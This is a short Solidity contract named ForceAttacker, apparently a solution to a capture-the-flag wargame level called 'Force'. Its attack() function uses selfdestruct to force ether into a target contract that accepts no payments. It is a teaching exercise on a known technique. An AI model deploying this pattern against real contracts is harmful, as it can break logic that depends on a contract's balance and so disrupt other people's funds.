// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target/Force.sol";

contract ForceAttacker {
    Force force;

    constructor(address _force) {
        force = Force(_force);
    }

    // https://solidity-by-example.org/hacks/self-destruct/
    function attack() public payable {
        address payable mintAddress = payable(address(force));
        selfdestruct(mintAddress);
    }
}
